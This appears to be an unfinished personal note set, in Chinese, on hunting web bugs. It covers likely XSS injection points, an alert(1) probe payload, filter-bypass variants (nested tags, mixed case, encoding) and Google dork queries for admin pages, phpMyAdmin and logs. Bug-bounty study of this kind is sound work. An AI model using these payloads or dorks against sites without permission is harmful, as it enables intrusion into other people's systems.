# Web_Bug_Hunting

# XSS
跨站腳本攻擊是目前我尋找的網頁漏洞最多的之一，其中以反射型XSS為最大宗

心得與找security bug的方法:
1. 找到注入點:

反射型XSS常出現在`搜尋框`、`url`、`登入頁面`**(出現在GET參數後機率高)**

儲存型XSS常出現在`留言板` **(可以用Google Hacking搜尋`intext:"留言板"`、`intitle:"留言板"`)**

2.注入基本payload觀察回應:

我自己常用 **"><script>alert(1)</script>**，常會出現以下情況:

    - 直接噴alert框
    
    - <script>被擋掉 --> 
    
      換tag bypass (<iframe>、<img>)
      
      編碼bypass (url encode、html entities...)
      
      雙tag bypass (<scr<script>ipt>alert(1)</scr</script>ipt>)
      
      大小寫混和bypass (<ScRiPt>alert(1)</ScRiPt>)
      
      雙tag + 大小寫混和 bypass (<ScR<script>IpT>)

以下是我在找網頁漏洞時用過的payload
- "><script>alert(1)</script>
- '>alert(1)</script>
- <iframe%20onload="alert(1)"></iframe>
- 

# Information Leakage
 - Google Haking search for Leakage
   - inurl:"admin"
   - inurl:"admin.php"
   - inurl:"login.php"
   - inurl:"phpMyAdmin"
   - inurl:"log"
   - inurl:
# 
